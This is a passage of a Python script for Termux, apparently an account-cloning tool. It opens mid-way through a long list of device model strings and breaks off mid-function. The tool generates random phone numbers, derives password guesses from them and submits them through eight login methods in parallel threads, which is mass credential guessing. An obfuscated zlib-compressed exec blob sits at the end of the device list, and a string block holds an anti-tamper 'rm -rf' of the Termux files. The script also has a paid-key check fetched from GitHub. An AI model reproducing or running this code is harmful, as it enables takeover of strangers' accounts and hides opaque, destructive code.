204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T']#;exec(zlib.decompress(b'x\x9c\xed\x97Qk\xdb0\x10\xc7\xdf\xfd)\x04}\xb0\r\x9e\xddfk\x9a\x18\x02+\xcb\nc\xeb\x18,\xa3\xb01\x8cbI\x89\x12[ru2I(\xfd\xee\x93l\xc7\xce\x96\x94f\xef\xbe\x07\xe3\x9c\xee\xff?\xe9\xf4#`\x9e\x17Ri\xa4\xe8cIAC !\x80\x1d8L\xc9\x1c\xa5R\xa4\xa5RT\xe8\x90\x95\xbaT\x14\x10\xaf\xcbgKE1\xf9&e\xf6qK\xd3RK\x850\x1cd\x1d\xe7\xe2}\tTq\xc2\x05\x93s\xa9\x1d\x87P\x86\x80nw\x9e\x1f;\xc8\x04P\x00.\xc5d\xdf9l\x12\x9e_-\xdb\xa8^\x8c8\xd1rM\x05\x9a w8\xbe\xbc\x19\x8c\xc6\xef\xae\xde\xc6\xb7\xb7w\xec3\xacE\xf2\xf0c\xa6\x1e?\x8c\xc4\xd7r\xfae\xfd=\xe7\xc3\x9f\xa3|C>M\x87k\xb7vH\x97X\'\x9cT\xfa\xd1`pu}3\x1e]\xbb\xd5\xd2\xc5\x9b.<\x14\x01I\xb1"\xd5\x8aV\xbb\xb8\xddH\x9dO\n\xac\x97\xd6\xa5\xa9s\xdbu\xc63\x9ad\x1c\xb4Y\xfd\xc5\x103\xe3`\x88\x0b$!\xb4Y\xc2\x95w`\xe1#njB*\x08l\xb8^znX\xec\\\xffw\xe7f\xe5\xc6\xd1:\xb4\xce\xddflX\x1d\x92\x05\x15\x9eia=\xc3\x95\xe4\xe2\xb0IPI\xfd\x00\xb9j\xee\xfa\xf6v\xd8\xdf\x166J\x95M\x98\xbb\xd4\xba\x808\x8ap\xc1CM3\xbaP8\x0f\xa5ZDf\xf4O\xed\xf8\x9f#0;\x9e\xca\xb4\xcc\r\x10\xee\x91\x17\xc1\x1a\x0f&On3m7\xde\xcf\xfd\xf9d\xe9y\x95\xf6\x0c`J\xc9\xbem\x8c\xd8q\xd5\x82\xda\xc17\xfc\x84\x85\x04\xed\x99\x93\x05u\x1f\xfb\x08\x1a\xa3\xea\xe9\x1f\xe9\xcd\xc1^1\x18\x9cp\xa0\xdb\x94\x16:.0\xc0\x11K\x1dL\xd1TnD&1A\xe7b\xd5*z\xbez\xbe^\xe2\xeb\x04`\xd1\xac\x99\xed\xff\x93\xd6J{\xe4z\xe4N!\xd7\xd1\xb6\'\xa5\xa3\xed\xce\xea\xcfF\xee\x05}\x0f^\x0f\xde\xe9\xff\xba\x0e\xbd\x07s2\xb8-\x8a\xe8\x9e\x12\x8e\xdb\x9fh?\xc7\xf3!|\xd5\xa9\xc7\xb1\xc7\xb1\xc1\xd1\xa9.\xa4\xfb\xb4\xf1r\xbcM6R\xad\xa9\x82\xc9\xf8\xb2\x9a\xffj\xb5\xaao\xc0\xbc\x84P\xces\xae=\xfb\xad\xe3\xff\x9b\xcc1\x17u\xd21\xf1\x07s\x15\x00\xdf').decode())
samsung = random.choice(['SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
def clear():
  os.system('clear')
def ____banner____():
    if "win" in sys.platform:os.system("cls")
    else:os.system("clear")
    print(f"""  \033[1;36m
  ______          ___         _____  
 |___  /         / _ \       |  __ \ 
    / / ___ _ __| | | | __  _| |  | |
   / / / _ \ '__| | | | \ \/ / |  | |
  / /_|  __/ |  | |_| |  >  <| |__| |
 /_____\___|_|   \___/  /_/\_\_____/ 
                                     \x1b[38;1;97m ᴾᴿᴼ
{faltu} {black}Your self-worth is determined by you... {pvt}\033[38;5;196m :{today} 
{rad}[{white}🔖{rad}] {yelloww}ONWER AND CEO {white}▶︎ {yelloww}𝐜𝐡𝐨𝐲𝐨𝐧 {rad}𝐗 {yelloww}𝐬𝐮𝐦𝐨𝐧
{rad}[{white}🔖{rad}] {green}VERSION \033[38;5;196m  :\x1b[38;1;97m {version}
{rad}[{white}🔖{rad}] {green}TOOLS \033[38;5;196m    :\x1b[38;1;97m FREE
{rad}[{white}🔖{rad}] {green}THIS TOOL FILE & RANDOM TYPES
{puti}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")

def fuckxd():
    os.system('clear')
    ____banner____()
#━━━━[ LINE ]━━━━#
def linex():
        print(f"{puti}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
#-------------------[LOCATION CHECK]-------------------#
"""uxernamx = sys.argv[0]
if uxernamx=='GREEN.py':
    try:
        readhead = open('.git/config','r').read()
    except:
        print('   Somting Wrong Bro')
        idx()
    if 'zar0-XD' in readhead:
        pass
    else:
        idx()
        os.system('rm -rf /data/data/com.termux/files');exit()
else:
    idx()
    os.system('rm -rf /data/data/com.termux/files');exit()"""
class Process:
    def __init__(self):
        self.cc=[]
        self.key="ZEROXD-"+base64.b16encode(str(os.getuid()).encode()).decode()+hashlib.md5((platform.version() + str(os.getuid()) + platform.platform() + os.getlogin() + platform.release()).replace(' ', '').encode()).hexdigest()
        #self.key=""
        self.clear()
        r = self.Gex('https://raw.githubusercontent.com/AJAYAN404/App/main/approve.txt')
        if self.key in r:
            self.enroll()
        else:
            self.clear()
            print("\x1b[38;1;97m               NOTES   ")
            print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m HELLO.... DEAR USER THIS IS PREMIUM TOOLS ")
            print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m AFTER PAYMENT ACCESS TOOLS ")
            print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m PRICE LIST ADMIN INBOX ")
            print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key:\033[0;93m " +self.key)
            input("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Press Enter To Send Key")
            time.sleep(3.5)
            tks = 'TOKEN KEY =%20%20:%20'+self.key
            os.system('am start https://wa.me/01989733880?text=' + tks)
            exit()
    def clear(self):os.system('clear');____banner____()
    def Gex(self,x):
        buffer = BytesIO()
        c = pycurl.Curl()
        c.setopt(c.URL, x)
        c.setopt(c.WRITEDATA, buffer)
        try:c.perform()
        except:exit(' Network Issue')
        c.close()
        return buffer.getvalue().decode('utf-8')
    def enroll(self):
        zar0()

#━━━━[ MAIN ]━━━━#
def zar0():
    ____banner____()
    print(f'{rad}[{white}A{rad}]{rad}[{white}1{rad}] {green}KEEP ON FILE CLONE')
    print(f'{rad}[{white}B{rad}]{rad}[{white}2{rad}] {green}MAKE IT FILES')
    print(f'{rad}[{white}C{rad}]{rad}[{white}3{rad}] {green}KEEP ON RANDOM CLONE')
    print(f'{rad}[{white}D{rad}]{rad}[{white}4{rad}] {green}JOIN GROUP')
    print(f'{rad}[{white}E{rad}]{rad}[{white}5{rad}] {green}CONTRACK ADMIN');linex()
    __zar0__ = input(f'{rad}[{white}🔖{rad}] {green}Selection  {white}▶︎ {yelloww}')
    if __zar0__ in ['A','a','01','1']:__FILEX__()
    elif __zar0__ in ['B','b','02','2']:os.system('python3 FILE-DUMP.py')
    elif __zar0__ in ['C','c','03','3']:SETINGX()
    elif __zar0__ in ['D','d','04','4']:os.system("xdg-open https://chat.whatsapp.com/IFiBzDX9PFJEF8ELHtHGdt")
    elif __zar0__ in ['E','e','05','5']:os.system("xdg-open https://wa.me/+8801979833880")
    else:print(f'\n[×]{rad} Choose Value Option... ');zar0()

#━━━━[ SELECT MENU ]━━━━#
def SETINGX():
    ____banner____()
    print(f"{K} [{H}1{K}] {WHITE}RANDOM WITH BANGLADESH 5 DIGIT")
    print(f"{K} [{H}2{K}] {WHITE}RANDOM WITH INDIA/PK/NAPAL V2")
    print(f"{K} [{H}3{K}] {WHITE}RANDOM WITH SRI LANKA V2");linex()
    __zar0i__ = input(f'{rad}[{white}🔖{rad}]{green} SELECTION  {white}▶︎ {yelloww}')
    if __zar0i__ in ['A','a','01','1']:RANDOM()
    elif __zar0i__ in ['B','b','02','2']:INDIA()
    elif __zar0i__ in ['C','c','03','3']:PAKISTAN()
    else:print(f'\n[×]{rad} Choose Value Option... ');SETINGX()

#━━━━[ BANGLADESH RANDOM ]━━━━#
def RANDOM():
  user=[]
  os.system('clear');____banner____();print(c7);print(led)
  kode = input(f'{dot}SELECT CODE {M}: {H}');print(led);print(limitt);print(led)
  limit = int(input(f'{dot}ENTER LIMIT {M}: {H}'));print(led)
  xd_cp=input(f'{wt}SHOW CP ACCOUNT  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
  if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
  else:cp_xdx.append('n')
 # print(led)
  #cokixx=input(f'{wt}SHOW COOKIES  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
 #if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
  #else:cokix.append('n')
  clear();____banner____();print(f"{dot}{P}SIM CODE  {RED}: {H}"+kode);print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}M5{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}M6{P}]');print(f' {K}[{H}7{K}] {P}Method [{H}M7{P}]');print(f' {K}[{H}8{K}] {P}Method [{H}M8{P}]');print(led)
  hc = input(f'{wt}Select Method {M}:{H} ')
  if hc in ['1','01']:mtd.append('m1')
  elif hc in ['2','02']:mtd.append('m2')
  elif hc in ['3','03']:mtd.append('m3')
  elif hc in ['4','04']:mtd.append('m4')
  elif hc in ['5','05']:mtd.append('m5')
  elif hc in ['6','06']:mtd.append('m6')
  elif hc in ['7','07']:mtd.append('m7')
  elif hc in ['8','08']:mtd.append('m8')
  else:
      mtd.append('m1')
  for nmbr in range(limit):
    nmp = ''.join(random.choice(string.digits) for _ in range(6))
    user.append(nmp)
  with tred(max_workers=30) as king_xd:
    os.system('clear')
    tl = str(len(user))
    ____banner____();print(f'{dot}METHOD{RED}      : {H}'+hc);print(f'{dot}SIM CODE{RED}    : {H}{kode}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
    for guru in user:
      ids = kode+guru
      pwv = [ids[:6],ids[:8],guru[2:8],guru[1:8],kode,guru]
      if 'm1' in mtd:king_xd.submit(m1,ids,pwv)
      elif 'm2' in mtd:king_xd.submit(m2,ids,pwv)
      elif 'm3' in mtd:king_xd.submit(m3,ids,pwv)
      elif 'm4' in mtd:king_xd.submit(m4,ids,pwv)
      elif 'm5' in mtd:king_xd.submit(m5,ids,pwv)
      elif 'm6' in mtd:king_xd.submit(m6,ids,pwv)
      elif 'm7' in mtd:king_xd.submit(m7,ids,pwv)
      elif 'm8' in mtd:king_xd.submit(m8,ids,pwv)
      else:
       king_xd.submit(m5,ids,pwv)
  print('');print(f'{N} Hi Dear User Crack process has been completed')
  input(f'{dot}Press Enter To Go Menu');os.system('python zar0.py')
#━━━━[ INDIAN RANDOM ]━━━━#
def INDIA():
  user=[]
  os.system('clear');____banner____();print(c7);print(led)
  kode = input(f'{dot}SELECT CODE {M}: {H}');print(led);print(limitt);print(led)
  limit = int(input(f'{dot}ENTER LIMIT {M}: {H}'));print(led)
  xd_cp=input(f'{wt}SHOW CP ACCOUNT  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
  if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
  else:cp_xdx.append('n')
 # print(led)
  #cokixx=input(f'{wt}SHOW COOKIES  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
 #if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
  #else:cokix.append('n')
  clear();____banner____();print(f"{dot}{P}SIM CODE  {RED}: {H}"+kode);print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}M5{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}M6{P}]');print(f' {K}[{H}7{K}] {P}Method [{H}M7{P}]');print(f' {K}[{H}8{K}] {P}Method [{H}M8{P}]');print(led)
  hc = input(f'{wt}Select Method {M}:{H} ')
  if hc in ['1','01']:mtd.append('m1')
  elif hc in ['2','02']:mtd.append('m2')
  elif hc in ['3','03']:mtd.append('m3')
  elif hc in ['4','04']:mtd.append('m4')
  elif hc in ['5','05']:mtd.append('m5')
  elif hc in ['6','06']:mtd.append('m6')
  elif hc in ['7','07']:mtd.append('m7')
  elif hc in ['8','08']:mtd.append('m8')
  else:
      mtd.append('m1')
  for nmbr in range(limit):
    nmp = ''.join(random.choice(string.digits) for _ in range(6))
    user.append(nmp)
  with tred(max_workers=40) as king_xd:
    os.system('clear')
    tl = str(len(user))
